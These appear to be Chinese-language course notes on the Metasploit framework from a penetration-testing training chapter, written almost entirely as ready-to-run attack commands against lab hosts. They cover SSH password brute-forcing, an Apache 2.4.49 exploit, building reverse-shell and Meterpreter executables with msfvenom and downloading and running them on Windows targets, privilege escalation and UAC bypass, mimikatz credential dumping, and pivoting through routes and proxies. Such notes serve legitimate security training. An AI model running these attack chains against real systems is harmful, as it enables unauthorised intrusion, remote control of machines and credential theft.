本篇对应教材第20章，主要内容“熟悉Metasploit框架”、“MSF载荷”、“使用MSF后渗透”和“自动化MSF”，记录使用工具和命令

## 20.1 熟悉Metasploit框架

### 20.1.1 MSF基本设置

数据库初始化

```armasm
sudo msfdb init
```

如果想开机启动数据库可以

```armasm
sudo systemctl enable postgresql
```

启动MSF并查看数据库状态

```armasm
sudo msfconsole
db_status
```

帮助命令

```armasm
help
```

查看并新建工作区

```armasm
workspace
workspace -a pen200
```

nmap扫描并将结果存进数据库

```armasm
db_nmap
db_nmap -A 192.168.50.202
```

在数据库里查看主机、服务、指定端口服务

```armasm
hosts
services
services -p 8000
```

命令帮助信息查询

```armasm
show -h
```

### 20.1.2 工具模块

查看

```armasm
show auxiliary
```

搜索并使用，查看工具模块说明、参数等

```armasm
search type:auxiliary smb
use 56
info
show options
```

设置参数，取消设置，从数据库中筛选设置，运行，查看结果

```armasm
set RHOSTS 192.168.50.202
unset RHOSTS
services -p 445 --rhosts
run
vulns
```

ssh登录尝试工具搜索并使用，查看正确的账号密码

```armasm
search type:auxiliary ssh
use 15
show options
set PASS_FILE /usr/share/wordlists/rockyou.txt
set USERNAME george
set RHOSTS 192.168.50.201
set RPORT 2222
run

creds
```

### 20.1.3 漏洞利用模块

创建工作区，搜索漏洞利用工具，查看并设置参数，设置payload及参数，运行

```armasm
workspace -a exploits
search Apache 2.4.49
use 0
info
show options
set payload payload/linux/x64/shell_reverse_tcp
show options
set SSL false
set RPORT 80
set RHOSTS 192.168.50.16
run
```

成功后获得shell，使用Ctrl+z然后y将session置于后台，列举所有sessions，进入某个session，取消某个session

```armasm
sessions -l
sessions -i 2
sessions -k 2
```

后台监听和持续监听

```armasm
run -j
run -z
```

## 20.2 MSF载荷

### 20.2.1 分段与非分段载荷

查看载荷

```armasm
show payloads
```

一般看有_的是非分段，有/是分段载荷，例如

```armasm
shell_reverse_tcp 非分段
shell/reverse_tcp 分段
```

### 20.2.2 Meterpreter载荷

查看，使用，查看参数，在漏洞利用中使用

```armasm
show payloads

payload/linux/x64/meterpreter_reverse_tcp

set payload 11
show options
run
```

获得权限，查看帮助

```armasm
meterpreter > help
```

查看系统信息

```armasm
sysinfo
getuid
```

获得shell，置于后台，查看所有shell信息，进入后台指定shell

```armasm
shell

Ctrl+Z再按y可以把shell放在后台
channel -l
channel -i 1
```

查看本地路径，切换本地路径，下载文件，读取本地文件，上传文件，查看目标机器文件，退出

```armasm
meterpreter > lpwd

lcd /home/kali/Downloads
download /etc/passwd
lcat /home/kali/Downloads/passwd
upload /usr/bin/unix-privesc-check /tmp/
ls /tmp
exit
```

### 20.2.3 可执行有效载荷

查看、生成（非分段）、下载、执行、获得shell

```armasm
msfvenom -l payloads --platform windows --arch x64
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe
iwr -uri http://192.168.119.2/nonstaged.exe -Outfile nonstaged.exe
.\nonstaged.exe
nc -nvlp 443
```

分段载荷需要在MSF的multi/handler下使用，否则nc监听拿到shell无法执行命令

生成，启动msf，使用multi/handler

```armasm
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o staged.exe

use multi/handler
set payload windows/x64/shell/reverse_tcp
show options
set LHOST 192.168.119.2
set LPORT 443
run
```

后台运行，查看job

```armasm
run -j
jobs
```

## 20.3 使用MSF后渗透

### 20.3.1 核心后渗透功能

生成payload，上传，运行，获得shell

```armasm
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.119.4 LPORT=443 -f exe -o met.exe
use multi/handler
set payload windows/x64/meterpreter_reverse_https
set LPORT 443
run

nc 192.168.50.223 4444
powershell
iwr -uri http://192.168.119.2/met.exe -Outfile met.exe
.\met.exe
```

后渗透功能：查看空闲时间、提权、进程迁移、隐藏窗口运行

```armasm
idletime

shell
whoami /priv
有SeImpersonatePrivilege
exit
getuid
getsystem
getuid


ps
migrate 8052
ps
getuid

execute -H -f notepad
migrate 2720
```

### 20.3.2 后渗透模块

bypass UAC

```armasm
getsystem
ps
migrate 8044
getuid
Server username: ITWK01\offsec

shell
powershell -ep bypass
Import-Module NtObjectManager
Get-NtTokenIntegrityLevel
Medium  说明有UAC

Ctrl+Z y后台运行shell
bg
search UAC
use exploit/windows/local/bypassuac_sdclt
show options
set SESSION 9
set LHOST 192.168.119.4
run

shell
powershell -ep bypass
Import-Module NtObjectManager
Get-NtTokenIntegrityLevel
High
```

mimikatz获取hash

```armasm
use exploit/multi/handler
run
getsystem
load kiwi
help
creds_msv
```

### 20.3.3 设置路由和代理

```armasm
ipconfig
发现是双网卡192和172段

meterpreter > bg
[*] Backgrounding session 12...

route add 172.16.5.0/24 12
route print

IPv4 Active Routing Table
=========================

   Subnet             Netmask            Gateway
   ------             -------            -------
   172.16.5.0         255.255.255.0      Session 12

端口扫描
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.5.200
set PORTS 445,3389
run

use exploit/windows/smb/psexec
set SMBUser luiza
set SMBPass "BoccieDearAeroMeow1!"
set RHOSTS 172.16.5.200
set payload windows/x64/meterpreter/bind_tcp
set LPORT 8000
run
```

自动设置路由

```armasm
use multi/manage/autoroute
show options
sessions -l
set session 12
run
就可以自动添加192和172理由
```

设置代理

```armasm
use auxiliary/server/socks_proxy
show options
set SRVHOST 127.0.0.1
set VERSION 5
run -j

默认是1080端口
```

配置，使用

```armasm
tail /etc/proxychains4.conf

socks5 127.0.0.1 1080

sudo proxychains xfreerdp /v:172.16.5.200 /u:luiza
```

端口转发

```armasm
sessions -i 12
portfwd -h
portfwd add -l 3389 -p 3389 -r 172.16.5.200
sudo xfreerdp /v:127.0.0.1 /u:luiza
```

## 20.4 自动化MSF

### 20.4.1 资源脚本

创建脚本文件listener.rc

```armasm
use exploit/multi/handler
set PAYLOAD windows/meterpreter_reverse_https
set LHOST 192.168.119.4
set LPORT 443
set AutoRunScript post/windows/manage/migrate 
set ExitOnSession false
run -z -j
```

加载脚本文件

```armasm
sudo msfconsole -r listener.rc
```

运行payload

```armasm
iwr -uri http://192.168.119.4/met.exe -Outfile met.exe
.\met.exe
```

获得shell并自动迁移到notepad进程，并后台运行

其他系统自带脚本

```armasm
ls -l /usr/share/metasploit-framework/scripts/resource
```

更多更新资料（微信公众号：TopRedTeam）

![](./qrcode.jpg)
